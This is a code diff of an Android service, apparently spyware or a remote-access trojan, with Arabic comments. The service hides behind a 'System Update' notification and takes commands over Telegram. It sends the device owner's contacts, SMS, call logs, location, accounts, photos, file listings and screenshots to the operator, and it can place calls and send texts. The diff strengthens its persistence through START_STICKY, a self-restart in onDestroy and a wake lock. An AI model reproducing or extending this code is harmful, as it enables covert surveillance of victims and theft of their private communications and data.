@@ -78,55 +78,58 @@ public class MainService extends Service {
     public void onCreate() {
         super.onCreate();
 
-        try {
-            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
-            wakeLock.acquire();
-        } catch (Exception e) { /* ignore */ }
+        // 1. WakeLock لضمان عدم النوم
+        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
+        wakeLock.acquire();
 
-        // إعداد MediaProjection للشاشة
-        try {
-            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-            DisplayMetrics metrics = new DisplayMetrics();
-            wm.getDefaultDisplay().getMetrics(metrics);
-            screenWidth = metrics.widthPixels;
-            screenHeight = metrics.heightPixels;
-            screenDensity = metrics.densityDpi;
-        } catch (Exception e) { /* ignore */ }
+        // 2. إعداد MediaProjection
+        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+        DisplayMetrics metrics = new DisplayMetrics();
+        wm.getDefaultDisplay().getMetrics(metrics);
+        screenWidth = metrics.widthPixels;
+        screenHeight = metrics.heightPixels;
+        screenDensity = metrics.densityDpi;
 
+        // 3. بدء الخدمة في المقدمة
         startForegroundService();
 
-        // تأخير إرسال الرسالة الأولى
+        // 4. إرسال رسالة تأكيد بعد 2 ثانية
         handler.postDelayed(() -> sendToTelegram("✅ MainService Started"), 2000);
 
+        // 5. بدء مراقبة الأوامر كل 5 ثواني
         timer = new Timer();
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
                 try {
                     checkCommands();
-                } catch (Exception e) { /* ignore */ }
+                } catch (Exception ignored) { }
             }
         }, 5000, 5000);
     }
 
     private void startForegroundService() {
-        try {
-            String channelId = "main_channel";
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                NotificationChannel channel = new NotificationChannel(channelId, "Main Service",
-                        NotificationManager.IMPORTANCE_LOW);
-                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-                if (manager != null) manager.createNotificationChannel(channel);
-            }
-            Notification notification = new NotificationCompat.Builder(this, channelId)
-                    .setContentTitle("System Update")
-                    .setContentText("يعمل في الخلفية")
-                    .setSmallIcon(android.R.drawable.stat_notify_sync)
-                    .build();
-            startForeground(1, notification);
-        } catch (Exception e) { /* ignore */ }
+        String channelId = "main_channel";
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(channelId, "Main Service",
+                    NotificationManager.IMPORTANCE_LOW);
+            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (manager != null) manager.createNotificationChannel(channel);
+        }
+        Notification notification = new NotificationCompat.Builder(this, channelId)
+                .setContentTitle("System Update")
+                .setContentText("يعمل في الخلفية")
+                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                .build();
+        startForeground(1, notification);
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        // هذا هو السر الرئيسي: START_STICKY يجعل الخدمة تعاد تشغيلها إذا قتلها النظام
+        return START_STICKY;
     }
 
     private void checkCommands() {
@@ -153,12 +156,12 @@ public class MainService extends Service {
                             }
                         }
                         response.close();
-                    } catch (Exception e) { /* ignore */ }
+                    } catch (Exception ignored) { }
                 }
                 @Override
-                public void onFailure(Call call, IOException e) { /* ignore */ }
+                public void onFailure(Call call, IOException e) { }
             });
-        } catch (Exception e) { /* ignore */ }
+        } catch (Exception ignored) { }
     }
 
     private void executeCommand(String command) {
@@ -224,7 +227,7 @@ public class MainService extends Service {
                 default:
                     break;
             }
-        } catch (Exception e) { /* ignore */ }
+        } catch (Exception ignored) { }
     }
 
     private void sendHelp() {
@@ -261,7 +264,7 @@ public class MainService extends Service {
                 info.put("phone", tm.getLine1Number());
 
             sendToTelegram("📱 Device Info:\n" + info.toString(2));
-        } catch (Exception e) {}
+        } catch (Exception e) { }
     }
 
     private int getBatteryLevel() {
@@ -295,7 +298,7 @@ public class MainService extends Service {
                 if (cursor != null) cursor.close();
                 if (count == 0) sb.append("No contacts");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {}
+            } catch (Exception e) { }
         }).start();
     }
 
@@ -313,7 +316,7 @@ public class MainService extends Service {
             } else {
                 sendToTelegram("📍 Location not available");
             }
-        } catch (Exception e) {}
+        } catch (Exception e) { }
     }
 
     private void getSms() {
@@ -334,7 +337,7 @@ public class MainService extends Service {
                 if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No SMS");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {}
+            } catch (Exception e) { }
         }).start();
     }
 
@@ -358,7 +361,7 @@ public class MainService extends Service {
                 if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No calls");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {}
+            } catch (Exception e) { }
         }).start();
     }
 
@@ -373,7 +376,7 @@ public class MainService extends Service {
                 }
                 if (accounts.length == 0) sb.append("No accounts");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {}
+            } catch (Exception e) { }
         }).start();
     }
 
@@ -396,7 +399,7 @@ public class MainService extends Service {
                 if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No photos");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {}
+            } catch (Exception e) { }
         }).start();
     }
 
@@ -419,7 +422,7 @@ public class MainService extends Service {
                 if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No videos");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {}
+            } catch (Exception e) { }
         }).start();
     }
 
@@ -435,7 +438,7 @@ public class MainService extends Service {
                 listFiles(storage, sb, 0);
                 if (sb.length() == 0) sb.append("No files");
                 sendToTelegram(sb.toString());
-            } catch (Exception e) {}
+            } catch (Exception e) { }
         }).start();
     }
 
@@ -500,7 +503,7 @@ public class MainService extends Service {
                     mediaProjection = projectionManager.getMediaProjection(resultCode, data);
                 }
             }
-        } catch (Exception e) { /* ignore */ }
+        } catch (Exception e) { }
     }
 
     private void sendScreenshot(Bitmap bitmap) {
@@ -522,10 +525,10 @@ public class MainService extends Service {
             client.newCall(request).enqueue(new okhttp3.Callback() {
                 @Override
                 public void onResponse(Call call, Response response) {
-                    try { response.close(); } catch (Exception e) {}
+                    try { response.close(); } catch (Exception e) { }
                     file.delete();
                 }
-                @Override public void onFailure(Call call, IOException e) {}
+                @Override public void onFailure(Call call, IOException e) { }
             });
         } catch (Exception e) {
             sendToTelegram("❌ فشل إرسال الصورة: " + e.getMessage());
@@ -583,7 +586,7 @@ public class MainService extends Service {
                 v.vibrate(2000);
             }
             sendToTelegram("📳 Vibrating");
-        } catch (Exception e) {}
+        } catch (Exception e) { }
     }
 
     private void openUrl(String url) {
@@ -592,7 +595,7 @@ public class MainService extends Service {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
             sendToTelegram("🔗 Opening: " + url);
-        } catch (Exception e) {}
+        } catch (Exception e) { }
     }
 
     private void makeCall(String number) {
@@ -605,7 +608,7 @@ public class MainService extends Service {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
             sendToTelegram("📞 Calling: " + number);
-        } catch (Exception e) {}
+        } catch (Exception e) { }
     }
 
     private void sendSms(String number, String text) {
@@ -617,7 +620,7 @@ public class MainService extends Service {
             SmsManager sms = SmsManager.getDefault();
             sms.sendTextMessage(number, null, text, null, null);
             sendToTelegram("📨 SMS sent to: " + number);
-        } catch (Exception e) {}
+        } catch (Exception e) { }
     }
 
     private void sendFile(File file, String caption) {
@@ -635,12 +638,12 @@ public class MainService extends Service {
             client.newCall(request).enqueue(new okhttp3.Callback() {
                 @Override
                 public void onResponse(Call call, Response response) {
-                    try { response.close(); } catch (Exception e) {}
+                    try { response.close(); } catch (Exception e) { }
                     file.delete();
                 }
-                @Override public void onFailure(Call call, IOException e) {}
+                @Override public void onFailure(Call call, IOException e) { }
             });
-        } catch (Exception e) {}
+        } catch (Exception e) { }
     }
 
     private void sendToTelegram(String text) {
@@ -654,11 +657,11 @@ public class MainService extends Service {
                     .build();
             client.newCall(request).enqueue(new okhttp3.Callback() {
                 @Override public void onResponse(Call call, Response response) {
-                    try { response.close(); } catch (Exception e) {}
+                    try { response.close(); } catch (Exception e) { }
                 }
-                @Override public void onFailure(Call call, IOException e) {}
+                @Override public void onFailure(Call call, IOException e) { }
             });
-        } catch (Exception e) {}
+        } catch (Exception e) { }
     }
 
     @Override
@@ -671,9 +674,8 @@ public class MainService extends Service {
             if (timer != null) timer.cancel();
             if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
             if (mediaRecorder != null) mediaRecorder.release();
-        } catch (Exception e) { /* ignore */ }
-        try {
-            startService(new Intent(this, MainService.class));
-        } catch (Exception e) { /* ignore */ }
+        } catch (Exception ignored) { }
+        // إعادة تشغيل الخدمة فوراً
+        startService(new Intent(this, MainService.class));
     }
 }
